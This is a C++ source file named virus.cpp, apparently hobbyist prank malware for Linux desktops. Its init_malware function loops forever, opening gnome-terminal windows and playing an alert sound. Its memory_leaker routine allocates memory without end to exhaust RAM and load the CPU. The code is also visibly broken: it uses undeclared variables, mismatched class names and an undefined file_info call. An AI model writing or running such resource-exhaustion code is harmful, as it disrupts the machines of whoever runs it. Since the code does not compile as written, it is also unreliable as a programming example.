/* virus.cpp
 *
 *  Created on: May 2, 2023
 *      Author: ayaanle
 */
 
 
#include <iostream>
#include <assert.h>
#include <filesystem>
#include <chrono>
#include <vector>
#include <string>
#include <error.h>
#include <fstream>
#include <errno.h>
#include "sysinfo.h"
#define GNOME_TERMINAL_CMD      "gnome-terminal -- "
#define ANNOYING_SOUND          "paplay /usr/share/sounds/gnome/default/alerts/drip.ogg"
#define CPU_TEMP_CMD            " "


using namespace std;
using namespace std::filesystem;

inline uint Startup::time_steps(uint8_t num)
{
    #ifdef _GLIBCXX_CHRONO
    auto count = std::chrono::seconds(num).count();
    return count;
    #endif
}


inline void sys_details(vector<string>paths)
{
    system_struct ss;
    cpu_struct* cpu;
    vector<string>::iterator it; 
    char ch;                       
    for(it = paths.begin();it!=paths.end();++it)
    {
       // accessing the most important hardware config infos
      ss.p = *it;
      if(p.has_filename() and not p.has_extension())
      {
        if(is_regular_file(p) and p.filename == "meminfo")
        {  
            while(!strm.eof())
            {
                ch = strm.get();
                ss.buffer.push_back(ch);
            }
        }
        else if(is_regular_file(p) and p.filename == "stat")
        {
            while(not strm.eof())
            {
                ch = strm.get();
                ss.buffer.push_back(ch);
            }
        }
        else{
           error("is not a regular file");
           exit(0);
           }
        }
        else
          exit(0);
      }
      ss.total_memory = stoi(ss.buffer.substr(15 , 9));
      ss.free_memory = stoi(ss.buffer.substr(40 , 16));
      cpu->cpu_usage = &ss.cpu_usage; 
}
 // cpu usage and temperature info properties init function
 //*param: cpu_struct is the struct that his properties are to be initialized
signed int* cpu_stat()
{
    cpu_struct cpu;
    if(system(CPU_TEMP_CMD) == 0)
       exit(0);
       
    string temp = to_string(system(CPU_TEMP_CMD));
    
    ss.cpu_temperature[0] = stoi(temp.substr());
    ss.cpu_temperature[1] = stoi(temp.substr());
    ss.cpu_temperature[2] = stoi(temp.substr());
    ss.cpu_temperature[3] = stoi(temp.substr());
    for(auto i = 0; i < cpu_temperature.length; ++i)
    {
       cpu_struct.temperatures[i] = ss.cpu_temperature[i];
    }
}

constexpr inline void init_malware()
{
   int counter = 0;
   
   for(;;)
        {
            while(counter != Startup::time_steps(2))
            {
               system(GNOME_TERMINAL_CMD);
               system(ANNOYING_SOUND);
                
               counter++;
            }
            
            counter -= Virus::time_steps(2);
        }
}

struct memo_struct* memory_leaker::memory_info()
{
    struct system_struct ss;
    struct memo_struct* memory_info;
    memory_info->total_memory = ss.total_memory;
    memory_info->free_memory = ss.free_memory;
    memory_info->used_memory = ss.used_memory;
}

inline void memory_leaker::leaker_init()
{
    memory_leaker ml;
    int* temperature = cpu_stat();
    struct memo_struct* memo_info = ml.memory_info();
    while(memo_info->used_memory != memo_info->total_memory
        or memo_info->free_memory != 0)
         {
           for(size_t i = 0; i < ss.cpu_temperature.length()
               and ss.cpu_temperature.length(); ++i)
           {
              while(cpu_temperature[i] != 50 and cpu_usage[i]  != 50)
                  int * i = new int[1000000];
           }
         }
         
}


int main(int argc , char* argv[])
{
    
    memory_leaker* memo_leaker;
    const struct memo_strcut* memo_info;  
    string str;
    vector<string>paths = {"/proc/cpuinfo" ,
                           "/proc/meminfo" ,
                           "/proc/stat"};  
    
    cout << str << endl;
    file_info(paths);
    strm.close();
    Virus virus;
    startup.init_malware();
    memory_leaker(memo_info);
    memo_leaker->leaker_init();
    return 0;
}
